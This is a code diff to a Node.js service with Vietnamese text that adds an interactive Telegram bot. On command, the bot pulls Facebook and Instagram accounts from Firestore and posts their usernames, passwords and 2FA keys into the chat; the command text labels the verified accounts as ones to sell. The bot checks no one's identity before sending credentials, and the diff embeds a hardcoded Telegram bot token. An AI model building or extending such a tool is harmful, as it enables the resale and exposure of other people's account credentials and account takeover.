@@ -25,17 +25,34 @@ const db = admin.firestore();
 const TELEGRAM_BOT_TOKEN = '8655291561:AAHksFJvgl0hkEnVRhD2JVDu6bJ54wmaZPY';
 
 // 2. Helper to send Telegram messages
-async function sendTelegramMessage(chatId, text) {
+async function sendTelegramMessage(chatId, text, replyMarkup = null) {
   if (!chatId) return;
   try {
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    const payload = {
       chat_id: chatId,
       text: text,
       parse_mode: 'HTML'
-    });
-    console.log(`Telegram notification sent to Chat ID ${chatId}`);
+    };
+    if (replyMarkup) {
+      payload.reply_markup = replyMarkup;
+    }
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, payload);
+    console.log(`Telegram message sent to Chat ID ${chatId}`);
   } catch (e) {
     console.error(`Failed to send Telegram message to ${chatId}:`, e.message);
+  }
+}
+
+async function sendTelegramLongMessage(chatId, text, replyMarkup = null) {
+  if (text.length <= 3500) {
+    await sendTelegramMessage(chatId, text, replyMarkup);
+    return;
+  }
+  const chunks = text.match(/[\s\S]{1,3500}/g) || [];
+  for (let i = 0; i < chunks.length; i++) {
+    const isLast = i === chunks.length - 1;
+    await sendTelegramMessage(chatId, chunks[i], isLast ? replyMarkup : null);
+    await new Promise(resolve => setTimeout(resolve, 500));
   }
 }
 
@@ -238,7 +255,174 @@ setInterval(scanActiveRequests, INTERVAL_MS);
 // Run initial scan immediately on startup
 setTimeout(scanActiveRequests, 5000);
 
-// 6. Simple HTTP Server for Health Checks (Required by Render/Koyeb)
+// 6. Telegram Interactive Bot Menu & Polling Logic
+const defaultReplyKeyboard = {
+  keyboard: [
+    [{ text: '💙 DS Tài khoản Tích Xanh' }, { text: '🔴 DS Tài khoản DIE' }],
+    [{ text: '📋 Danh sách Tất cả Hồ sơ' }, { text: '❓ Hướng dẫn' }]
+  ],
+  resize_keyboard: true,
+  persistent: true
+};
+
+async function handleTelegramMessage(msg) {
+  const chatId = msg.chat.id;
+  const text = (msg.text || '').trim();
+  const textLower = text.toLowerCase();
+
+  console.log(`Received Telegram message from ${chatId}: "${text}"`);
+
+  if (textLower === '/start' || textLower === '/menu' || textLower === 'menu' || textLower === '❓ hướng dẫn') {
+    const welcomeMsg = `🤖 <b>HỆ THỐNG QUẢN LÝ TÀI KHOẢN TÍCH XANH & LIVE/DIE</b>\n\n` +
+      `Vui lòng chọn nút chức năng bên dưới menu để xem và lấy tài khoản bán:\n\n` +
+      `• <b>💙 DS Tài khoản Tích Xanh:</b> Xem & copy nhanh thông tin (User, Pass, 2FA) tài khoản đã tích xanh để bán.\n` +
+      `• <b>🔴 DS Tài khoản DIE:</b> Danh sách các tài khoản bị chết/bị khóa.\n` +
+      `• <b>📋 Danh sách Tất cả Hồ sơ:</b> Danh sách tổng thể toàn bộ hồ sơ.`;
+
+    await sendTelegramMessage(chatId, welcomeMsg, defaultReplyKeyboard);
+    return;
+  }
+
+  if (textLower.includes('tích xanh') || textLower === '/tichxanh') {
+    try {
+      const snapshot = await db.collection('requests').get();
+      const verifiedDocs = snapshot.docs.filter(doc => doc.data().isVerified === true && doc.data().status !== 'cancelled');
+
+      if (verifiedDocs.length === 0) {
+        await sendTelegramMessage(chatId, `💙 <b>DS TÀI KHOẢN TÍCH XANH</b> 💙\n\nHiện chưa có tài khoản nào đạt tích xanh.`, defaultReplyKeyboard);
+        return;
+      }
+
+      let message = `💙 <b>DANH SÁCH TÀI KHOẢN ĐÃ CÓ TÍCH XANH (${verifiedDocs.length} ACC)</b> 💙\n` +
+        `<i>(Chạm trực tiếp vào chữ định dạng code để sao chép nhanh)</i>\n\n`;
+
+      verifiedDocs.forEach((doc, idx) => {
+        const r = doc.data();
+        const typeLabel = r.accountType === 'facebook' ? 'Facebook' : 'Instagram';
+        message += `<b>${idx + 1}. ${typeLabel}: @${r.instagramUsername}</b>\n` +
+          `• Họ tên: <b>${r.displayName || 'N/A'}</b>\n` +
+          `• User: <code>${r.instagramUsername}</code>\n` +
+          `• Pass: <code>${r.password || 'N/A'}</code>\n` +
+          `• 2FA: <code>${r.twoFactorKey || 'N/A'}</code>\n` +
+          `• Trạng thái: 💙 <b>TÍCH XANH</b>\n\n`;
+      });
+
+      await sendTelegramLongMessage(chatId, message, defaultReplyKeyboard);
+    } catch (e) {
+      await sendTelegramMessage(chatId, `Lỗi khi lấy danh sách tích xanh: ${e.message}`, defaultReplyKeyboard);
+    }
+    return;
+  }
+
+  if (textLower.includes('die') || textLower === '/die') {
+    try {
+      const snapshot = await db.collection('requests').get();
+      const deadDocs = snapshot.docs.filter(doc => doc.data().accountStatus === 'dead' && doc.data().status !== 'cancelled');
+
+      if (deadDocs.length === 0) {
+        await sendTelegramMessage(chatId, `🔴 <b>DS TÀI KHOẢN DIE</b> 🔴\n\nKhông có tài khoản nào bị DIE.`, defaultReplyKeyboard);
+        return;
+      }
+
+      let message = `🔴 <b>DANH SÁCH TÀI KHOẢN DIE (${deadDocs.length} ACC)</b> 🔴\n\n`;
+
+      deadDocs.forEach((doc, idx) => {
+        const r = doc.data();
+        const typeLabel = r.accountType === 'facebook' ? 'Facebook' : 'Instagram';
+        message += `<b>${idx + 1}. ${typeLabel}: @${r.instagramUsername}</b>\n` +
+          `• Họ tên: <b>${r.displayName || 'N/A'}</b>\n` +
+          `• User: <code>${r.instagramUsername}</code>\n` +
+          `• Trạng thái: 🔴 <b>BỊ DIE / KHÓA</b>\n\n`;
+      });
+
+      await sendTelegramLongMessage(chatId, message, defaultReplyKeyboard);
+    } catch (e) {
+      await sendTelegramMessage(chatId, `Lỗi khi lấy danh sách DIE: ${e.message}`, defaultReplyKeyboard);
+    }
+    return;
+  }
+
+  if (textLower.includes('tất cả') || textLower === '/tatca') {
+    try {
+      const snapshot = await db.collection('requests').get();
+      const activeDocs = snapshot.docs.filter(doc => doc.data().status !== 'cancelled');
+
+      if (activeDocs.length === 0) {
+        await sendTelegramMessage(chatId, `📋 <b>DANH SÁCH HỒ SƠ</b> 📋\n\nChưa có hồ sơ nào.`, defaultReplyKeyboard);
+        return;
+      }
+
+      let message = `📋 <b>DANH SÁCH TẤT CẢ HỒ SƠ (${activeDocs.length} ACC)</b> 📋\n\n`;
+
+      activeDocs.forEach((doc, idx) => {
+        const r = doc.data();
+        const typeLabel = r.accountType === 'facebook' ? 'Facebook' : 'Instagram';
+        const statusIcon = r.isVerified ? '💙 TÍCH XANH' : r.accountStatus === 'dead' ? '🔴 DIE' : '✅ LIVE';
+
+        message += `<b>${idx + 1}. ${typeLabel}: @${r.instagramUsername}</b>\n` +
+          `• Họ tên: ${r.displayName || 'N/A'}\n` +
+          `• Trạng thái: <b>${statusIcon}</b>\n\n`;
+      });
+
+      await sendTelegramLongMessage(chatId, message, defaultReplyKeyboard);
+    } catch (e) {
+      await sendTelegramMessage(chatId, `Lỗi khi lấy danh sách hồ sơ: ${e.message}`, defaultReplyKeyboard);
+    }
+    return;
+  }
+}
+
+let lastUpdateId = 0;
+
+async function pollTelegramUpdates() {
+  try {
+    const response = await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`, {
+      params: {
+        offset: lastUpdateId + 1,
+        timeout: 10,
+      },
+      timeout: 15000,
+    });
+
+    const updates = response.data.result || [];
+    for (const update of updates) {
+      lastUpdateId = Math.max(lastUpdateId, update.update_id);
+      if (update.message && update.message.text) {
+        await handleTelegramMessage(update.message);
+      }
+    }
+  } catch (e) {
+    if (!e.message.includes('timeout') && !e.message.includes('ECONNABORTED')) {
+      console.error('Error polling Telegram updates:', e.message);
+    }
+  }
+}
+
+async function startTelegramBotPolling() {
+  try {
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setMyCommands`, {
+      commands: [
+        { command: 'menu', description: 'Hiển thị menu nút bấm' },
+        { command: 'tichxanh', description: 'DS tài khoản Tích Xanh (Lấy bán)' },
+        { command: 'die', description: 'DS tài khoản bị DIE' },
+        { command: 'tatca', description: 'DS tất cả hồ sơ' },
+      ]
+    });
+    console.log("Telegram Bot commands registered successfully.");
+  } catch (e) {
+    console.error("Failed to register Telegram commands:", e.message);
+  }
+
+  while (true) {
+    await pollTelegramUpdates();
+    await new Promise(resolve => setTimeout(resolve, 1000));
+  }
+}
+
+// Start polling in background
+startTelegramBotPolling();
+
+// 7. Simple HTTP Server for Health Checks (Required by Render/Koyeb)
 const PORT = process.env.PORT || 8080;
 const server = http.createServer((req, res) => {
   if (req.url === '/healthz' || req.url === '/') {
